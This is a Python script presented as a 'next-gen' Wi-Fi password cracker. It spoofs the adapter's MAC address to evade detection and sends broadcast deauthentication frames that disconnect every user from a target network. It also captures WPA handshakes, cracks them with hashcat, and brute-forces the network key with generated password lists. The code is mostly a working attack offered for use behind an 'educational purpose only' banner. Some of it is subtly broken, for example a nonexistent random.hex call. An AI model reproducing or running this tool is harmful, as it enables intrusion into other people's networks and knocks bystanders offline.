import pywifi
from pywifi import const
import time
import threading
import queue
import logging
import asyncio
import aiofiles
import json
import os
import random
import psutil
import numpy as np
import argparse
from tqdm import tqdm
from collections import defaultdict
from scapy.all import *
import subprocess

# Configure logging
logging.basicConfig(filename='wi-fi-pass-crack.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

class AIPasswordGenerator:
    """Simulated AI-driven password generator (RNN-like)."""
    def __init__(self):
        self.transitions = defaultdict(lambda: defaultdict(int))
        self.common_words = ['password', 'wifi', 'admin', 'home', 'guest', '123', '2023']

    def train(self, words):
        for word in words:
            for i in range(len(word) - 1):
                self.transitions[word[i]][word[i + 1]] += 1

    def predict(self, length, num_passwords, base_words=None, captured=None):
        passwords = set(base_words or []).union(captured or [])
        self.train(base_words or self.common_words)

        probs = {char: {next_char: count / sum(counts.values()) 
                        for next_char, count in counts.items()} 
                 for char, counts in self.transitions.items()}

        # AI-like generation with weighted probabilities
        for _ in range(num_passwords // 3):
            pwd = random.choice(list(probs.keys()))
            while len(pwd) < length:
                last_char = pwd[-1]
                if last_char in probs and random.random() > 0.2:  # 80% follow model
                    next_char = np.random.choice(list(probs[last_char].keys()), 
                                               p=list(probs[last_char].values()))
                    pwd += next_char
                else:
                    pwd += random.choice('abcdefghijklmnopqrstuvwxyz0123456789!@#')
            passwords.add(pwd)

        # Targeted patterns
        for word in (base_words or self.common_words):
            for suffix in [str(i) for i in range(0, 100)] + ['!', '@', '#', '2023', '2024']:
                passwords.add(word + suffix)
                passwords.add(word.capitalize() + suffix)
                passwords.add(f"{word}{random.randint(1000, 9999)}")

        logging.info(f"AI generated {len(passwords)} passwords.")
        return list(passwords)

class NetworkMonitor:
    def __init__(self, iface):
        self.iface = iface
        self.running = True

    async def monitor(self, ssid):
        while self.running:
            networks = self.iface.scan_results()
            target = next((n for n in networks if n.ssid == ssid), None)
            if target:
                logging.info(f"Monitoring '{ssid}': Signal {target.signal}dBm")
                print(f"\rSignal: {target.signal}dBm", end="")
            await asyncio.sleep(3)

    def stop(self):
        self.running = False

class WiFiPassCrack:
    def __init__(self, adapters=None):
        self.wifi = pywifi.PyWiFi()
        self.adapters = adapters or [self.wifi.interfaces()[0]]
        self.ifaces = self.adapters
        self.password_queue = queue.Queue()
        self.result = None
        self.lock = threading.Lock()
        self.max_threads = min(psutil.cpu_count() * 4, 32)
        self.generator = AIPasswordGenerator()
        self.monitors = [NetworkMonitor(iface) for iface in self.ifaces]
        self.captured_passwords = set()

    def spoof_mac(self, iface):
        """Randomize MAC address for stealth."""
        new_mac = f"00:{':'.join([random.hex(2) for _ in range(5)])}"
        os.system(f"netsh interface set interface \"{iface.name}\" admin=disable >nul 2>&1")
        os.system(f"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e972-e325-11ce-bfc1-08002be10318}}\\0001 /v NetworkAddress /t REG_SZ /d {new_mac} /f >nul 2>&1")
        os.system(f"netsh interface set interface \"{iface.name}\" admin=enable >nul 2>&1")
        logging.info(f"Spoofed MAC for {iface.name} to {new_mac}")

    def scan_networks(self):
        networks = []
        for iface in self.ifaces:
            iface.scan()
            time.sleep(2)
            networks.extend(iface.scan_results())
        return sorted(set(networks), key=lambda x: x.signal, reverse=True)

    def load_passwords(self, file_path=None):
        if not file_path or not os.path.exists(file_path):
            return []
        with open(file_path, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
        logging.info(f"Loaded {len(passwords)} passwords from '{file_path}'.")
        return passwords

    def detect_encryption(self, network):
        akm = network.akm
        if const.AKM_TYPE_WPA2PSK in akm:
            return const.AKM_TYPE_WPA2PSK, const.CIPHER_TYPE_CCMP
        elif const.AKM_TYPE_WPAPSK in akm:
            return const.AKM_TYPE_WPAPSK, const.CIPHER_TYPE_TKIP
        return const.AKM_TYPE_NONE, const.CIPHER_TYPE_NONE

    def deauth_attack(self, ssid, target_mac=None, duration=30):
        logging.info(f"Launching targeted deauth attack on '{ssid}' for {duration}s...")
        print(f"Disconnecting {'all users' if not target_mac else f'device {target_mac}'} from '{ssid}'...")

        networks = self.scan_networks()
        target = next((n for n in networks if n.ssid == ssid), None)
        if not target:
            return

        bssid = target.bssid
        addr1 = target_mac or "ff:ff:ff:ff:ff:ff"  # Broadcast if no specific MAC
        pkt = RadioTap()/Dot11(addr1=addr1, addr2=bssid, addr3=bssid)/Dot11Deauth()
        start_time = time.time()

        for iface in self.ifaces:
            self.spoof_mac(iface)  # Stealth
            threading.Thread(target=lambda: sendp(pkt, iface=iface.name, count=10, 
                                                 inter=random.uniform(0.1, 0.5), verbose=0)).start()
            time.sleep(random.uniform(0.5, 1.5))

        while time.time() - start_time < duration:
            time.sleep(random.uniform(0.5, 2))  # Stealth intervals

        logging.info("Deauth attack completed.")

    def capture_handshake(self, ssid, timeout=60):
        logging.info(f"Capturing handshake for '{ssid}'...")
        print(f"Capturing handshake for '{ssid}'...")

        def packet_handler(pkt):
            if pkt.haslayer(EAPOL):
                with open(f"handshake_{ssid}.cap", "ab") as f:
                    f.write(bytes(pkt))
                logging.info(f"Captured handshake packet for '{ssid}'")

        networks = self.scan_networks()
        target = next((n for n in networks if n.ssid == ssid), None)
        if target:
            for iface in self.ifaces:
                sniff(iface=iface.name, prn=packet_handler, timeout=timeout//len(self.ifaces), 
                      filter=f"ether host {target.bssid}")
            self.analyze_handshake(ssid)

    def analyze_handshake(self, ssid):
        """Use hashcat to crack handshake (requires external setup)."""
        cap_file = f"handshake_{ssid}.cap"
        if os.path.exists(cap_file):
            logging.info(f"Analyzing handshake for '{ssid}' with hashcat...")
            try:
                subprocess.run(["hashcat", "-m", "22000", cap_file, "captured_passwords.txt"], 
                               check=True, capture_output=True, text=True)
                with open("hashcat.potfile", "r") as f:
                    for line in f:
                        if ":" in line:
                            pwd = line.split(":")[-1].strip()
                            self.captured_passwords.add(pwd)
                            logging.info(f"Hashcat cracked password: {pwd}")
            except subprocess.CalledProcessError as e:
                logging.error(f"Hashcat failed: {e.output}")

    async def test_password(self, ssid, akm_type, cipher_type, iface):
        while not self.password_queue.empty() and not self.result:
            password = self.password_queue.get()
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(akm_type)
            profile.cipher = cipher_type
            profile.key = password

            async with asyncio.Lock():
                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)

            for _ in range(2):
                iface.connect(tmp_profile)
                await asyncio.sleep(0.6)
                if iface.status() == const.IFACE_CONNECTED:
                    async with asyncio.Lock():
                        if not self.result:
                            self.result = password
                            logging.info(f"Password found: {password}")
                            print(f"\nSuccess! Password: {password}")
                    iface.disconnect()
                    return
                iface.disconnect()
                await asyncio.sleep(0.2)
            self.password_queue.task_done()

    async def crack_wifi(self, ssid, passwords, target_mac=None):
        logging.info(f"Cracking '{ssid}' with {len(passwords)} passwords.")
        print(f"Cracking '{ssid}' with {len(passwords)} passwords...")

        networks = self.scan_networks()
        target_network = next((n for n in networks if n.ssid == ssid), None)
        if not target_network:
            print(f"Error: Network '{ssid}' not found.")
            return None

        akm_type, cipher_type = self.detect_encryption(target_network)

        self.deauth_attack(ssid, target_mac)
        capture_thread = threading.Thread(target=self.capture_handshake, args=(ssid,))
        capture_thread.start()

        ssid_lower = ssid.lower()
        prioritized = [p for p in passwords if any(hint in p.lower() for hint in ssid_lower.split())]
        remaining = [p for p in passwords if p not in prioritized]
        passwords = prioritized + remaining + list(self.captured_passwords)

        for password in passwords:
            self.password_queue.put(password)

        num_threads = min(self.max_threads, max(1, len(passwords) // 500 + 1)) // len(self.ifaces)
        print(f"Using {num_threads} threads per adapter ({len(self.ifaces)} adapters)...")
        tasks = []
        monitor_tasks = [asyncio.create_task(m.monitor(ssid)) for m in self.monitors]

        for iface in self.ifaces:
            tasks.extend([asyncio.create_task(self.test_password(ssid, akm_type, cipher_type, iface)) 
                          for _ in range(num_threads)])

        with tqdm(total=len(passwords), desc="Cracking", unit="pwd") as pbar:
            while self.password_queue.qsize() > 0 and not self.result:
                await asyncio.sleep(0.5)
                pbar.update(len(passwords) - self.password_queue.qsize() - pbar.n)

            await asyncio.gather(*tasks)
            for m in self.monitors:
                m.stop()
            await asyncio.gather(*monitor_tasks)
            capture_thread.join()

        if self.result:
            await self.save_result(ssid, self.result)
        return self.result

    async def save_result(self, ssid, password):
        data = {}
        if os.path.exists('cracked_networks.json'):
            async with aiofiles.open('cracked_networks.json', 'r') as f:
                data = json.loads(await f.read())
        data[ssid] = {'password': password, 'date': time.ctime(), 'adapters': len(self.ifaces)}
        async with aiofiles.open('cracked_networks.json', 'w') as f:
            await f.write(json.dumps(data, indent=4))
        logging.info(f"Saved cracked password for '{ssid}'.")

async def main(args):
    print("wi-fi-pass-crack - Next-Gen Wi-Fi Password Cracker")
    print("Educational Purpose Only - Use on authorized networks only.\n")

    cracker = WiFiPassCrack([pywifi.PyWiFi().interfaces()[i] for i in range(min(len(pywifi.PyWiFi().interfaces()), args.adapters))])
    networks = cracker.scan_networks()

    print("Available Networks:")
    for i, n in enumerate(networks):
        print(f"{i}. {n.ssid} (Signal: {n.signal}dBm)")

    target_ssid = args.ssid or networks[int(input("\nSelect network (number): "))].ssid
    base_passwords = cracker.load_passwords(args.password_file)
    custom_words = args.custom_words.split(',') if args.custom_words else []
    custom_words = [w.strip() for w in custom_words if w.strip()]
    num_passwords = args.num_passwords

    passwords = cracker.generator.predict(length=8, num_passwords=num_passwords, 
                                         base_words=base_passwords + custom_words,
                                         captured=cracker.captured_passwords)

    start_time = time.time()
    found_password = await cracker.crack_wifi(target_ssid, passwords, args.target_mac)
    elapsed_time = time.time() - start_time

    if found_password:
        print(f"\nCracked '{target_ssid}' in {elapsed_time:.2f}s! Password: {found_password}")
    else:
        print(f"\nFailed to crack '{target_ssid}' in {elapsed_time:.2f}s.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="wi-fi-pass-crack: Advanced Wi-Fi Password Cracker")
    parser.add_argument("--ssid", help="Target SSID (optional)")
    parser.add_argument("--password-file", help="Path to password file")
    parser.add_argument("--custom-words", help="Comma-separated custom words")
    parser.add_argument("--num-passwords", type=int, default=5000, help="Number of passwords to generate")
    parser.add_argument("--adapters", type=int, default=1, help="Number of adapters to use")
    parser.add_argument("--target-mac", help="MAC address of specific device to deauth")
    args = parser.parse_args()
    asyncio.run(main(args))
